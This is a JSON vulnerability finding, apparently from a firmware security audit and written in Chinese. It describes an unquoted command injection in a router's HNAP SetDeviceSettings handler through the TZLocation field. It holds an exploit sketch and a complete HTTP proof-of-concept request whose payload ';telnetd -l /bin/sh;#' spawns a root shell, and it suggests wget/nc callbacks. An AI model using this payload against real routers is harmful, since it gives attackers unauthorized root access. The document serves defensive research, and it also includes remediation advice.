@@ -1,0 +1,32 @@
+{
+  "job_id": "9160aafaa095",
+  "title": "HNAP SetDeviceSettings 的 TZLocation 参数无引号拼入 fota 命令，命令注入 RCE（第二处 sink）",
+  "severity": "critical",
+  "confidence": 0.55,
+  "vuln_class": "命令注入",
+  "cwe": "CWE-78",
+  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
+  "reachability": "static-only",
+  "summary": "同一 HNAP SetDeviceSettings 处理函数 save_CSID_SetDeviceSettings(sub_470F24 @0x470F24) 存在第二处命令注入：来自 HNAP/XML 键 TZLocation 的值经 hnap_xml_special_char_decoding 后写入请求上下文 ctx+172（snprintf(a3+172,33,\"%s\")），随后在反汇编 0x00471238-0x00471260（源码行 ws-hnap/SetDeviceSettings.c:0xE9）被当作 %s 拼入 exec_cmd 格式串 \"(fota -T %s; fota -I; fota -fQ) &\"。与行 0xA8 的 event_notifier 分支不同，这里的 %s 完全没有引号包裹，攻击者仅需 ; 或反引号即可注入任意 root shell 命令，无需闭合引号，利用门槛更低。ctx+172 的写入仅做 33 字节截断，不做字符白名单。httpd 以 root 运行；该 sink 还直连固件升级工具 fota，存在被用于加载任意固件镜像的二次危害。",
+  "evidence": [
+    "httpd @0x470F24 反汇编 0x004711F8-0x00471260：write_csman_str(csid,0x70001, ctx+0xAC) 后，li $t8,\"(fota -T %s; fota -I; fota -fQ) &\" 存入 $sp+0x490，紧接着 sw $s0(=ctx+0xAC) 到 $sp+0x494（%s 实参），jal _exec_cmd(file=\"ws-hnap/SetDeviceSettings.c\", func=\"save_CSID_SetDeviceSettings\", line=0xE9)",
+    "httpd @0x470D80 末段：snprintf(a3+172, 33, \"%s\", v12)；v12 为该键值对第 5/第 6 槽位；sub_4714DC @0x4714DC 把该槽位绑定到 XML 键 \"TZLocation\"（v21 = *v6）",
+    "进入 ctx+172 的字符串先经 hnap_xml_special_char_decoding(sub_422DE4 @0x422DE4)，该函数仅还原 &lt; &amp; &gt; &quot; &apos;，不剥离 ; ` $ ( ) | & 与空格",
+    "对比同函数另一 sink（0x00471314-0x00471340，行 0xA8）为 event_notifier 3001 \\\"U=0&Y=261&I=0&D=%s\\\"&，DeviceName 至少被双引号包裹；fota 分支的 -T %s 完全无引号无转义，注入门槛更低",
+    "process_method_hnap(sub_4084AC @0x4084AC) 在 vtable 间接调用前后不存在任何会话/凭据/CSRF 校验分支，仅 malloc(0x200000) 承载 body（httpd.c:2626/2653/2689）"
+  ],
+  "session_id": "s-mudkqaoe-70ee",
+  "function_name": "sub_470F24",
+  "preconditions": "httpd(80/tcp) 可达且 HNAP SetDeviceSettings 动作能被派发到 SetDeviceSettings_put；TZLocation 受 ctx+172 的 33 字节 snprintf 截断限制，载荷 ≤32 字节。是否存在强制已认证会话未做动态确认（该路径上未见校验代码），需模拟环境验证。",
+  "exploit_sketch": "1) 向 80 端口 HNAP 端点提交 SetDeviceSettings，TZLocation 填 `;telnetd -l /bin/sh;#`（无引号包裹，; 直接断句）。2) sub_470D80 将其 snprintf 进 ctx+172（33 字节上限）。3) sub_470F24 行 0xE9 组成 `(fota -T ;telnetd -l /bin/sh;#; fota -I; fota -fQ) &` 交 exec_cmd，以 root 执行。4) 载荷需 ≤32 字节；也可用反引号 / $() 形式。5) 命令在后台子 shell 执行、无回显，建议带外通道（wget / nc 回连）确认落地。",
+  "remediation": "1) 禁止把 TZLocation/DeviceName 等 HNAP 字段直接格式化进 shell 命令串，改用参数数组 execve/posix_spawn，或对时区名做严格白名单 ^[A-Za-z0-9_/+-]{1,32}$。2) 移除 exec_cmd 中\"文件+行号+格式串\"这种把业务数据当 shell 片段的封装用法。3) fota 调用改为固定参数或读取受控文件，避免 %s 直连 -T。4) HNAP Set* 动作派发前统一强制会话鉴权与 CSRF 校验，并将 /HNAP1 限制在已认证会话。",
+  "poc": "POST /HNAP1/ HTTP/1.1\nHost: 192.168.0.1\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://purenetworks.com/HNAP1/SetDeviceSettings\"\nContent-Length: <len>\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SetDeviceSettings xmlns=\"http://purenetworks.com/HNAP1/\">\n      <DeviceName>Router</DeviceName>\n      <AdminPassword>Admin</AdminPassword>\n      <ChangePassword>true</ChangePassword>\n      <TZLocation>;telnetd -l /bin/sh;#</TZLocation>\n    </SetDeviceSettings>\n  </soap:Body>\n</soap:Envelope>",
+  "call_chain": "80/tcp HTTP (IN-003) → httpd HNAP 分发 process_method_hnap @0x4084AC（HNAP 表 .data 0x4EE050 间接调用 +24/+28/+32，无会话校验）→ SetDeviceSettings SOAP 请求体 → SetDeviceSettings_put sub_4716BC @0x4716BC → sub_4714DC @0x4714DC（取 TZLocation/DeviceName 键值）→ sub_470D80 @0x470D80（hnap_xml_special_char_decoding 写入 ctx+172）→ save_CSID_SetDeviceSettings sub_470F24 @0x470F24 → exec_cmd(PLT 0x4ED02C) → 0x00471238-0x00471260 行 0xE9：exec_cmd(\"(fota -T %s; fota -I; fota -fQ) &\", ctx+172)",
+  "function_addr": "0x470f24",
+  "id": "F-mudl7op0-7f2b",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-09-23T04:12:51Z",
+  "history": []
+}
